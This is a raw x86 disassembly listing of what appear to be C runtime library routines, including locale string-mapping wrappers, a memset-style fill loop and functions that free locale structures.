  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
